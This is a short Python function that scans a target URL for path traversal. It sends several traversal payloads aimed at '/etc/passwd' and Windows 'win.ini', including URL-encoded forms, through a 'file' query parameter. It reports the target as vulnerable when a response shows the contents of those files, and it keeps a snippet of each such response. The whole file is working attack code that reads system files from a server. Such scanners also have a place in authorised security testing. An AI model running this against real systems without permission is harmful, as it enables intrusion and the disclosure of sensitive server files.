import requests
from urllib.parse import urljoin, urlencode

def scan_path_traversal(target_url):
    traversal_payloads = [
        "../../etc/passwd", "..\\..\\Windows\\win.ini",
        "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"
    ]

    vulnerable = False
    findings = []

    for payload in traversal_payloads:
        try:
            full_url = urljoin(target_url, f"?file={payload}")
            res = requests.get(full_url, timeout=5)

            if "root:x" in res.text or "[extensions]" in res.text:
                vulnerable = True
                findings.append({
                    "payload": payload,
                    "url": full_url,
                    "snippet": res.text[:200]
                })

        except requests.RequestException:
            continue

    return {
        "target": target_url,
        "vulnerable": vulnerable,
        "findings": findings
    }
